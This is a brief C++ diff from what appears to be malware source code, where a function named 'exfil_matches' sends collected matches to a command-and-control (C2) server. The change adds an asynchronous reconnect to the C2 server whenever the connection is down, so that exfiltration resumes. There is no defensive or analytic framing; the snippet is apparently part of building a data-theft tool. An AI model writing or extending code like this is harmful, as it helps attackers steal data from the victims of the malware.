@@ -18,6 +18,7 @@ void exfil_matches(C2 &c2con,std::vector<Match>& mvec)
 		c2con.send_packet(p);
 	}
 	else {
+		c2con.find_and_connect_async();
 		LOG("c2 connection not alive. CACHE NOT IMPLEMENTED");
 	}
 
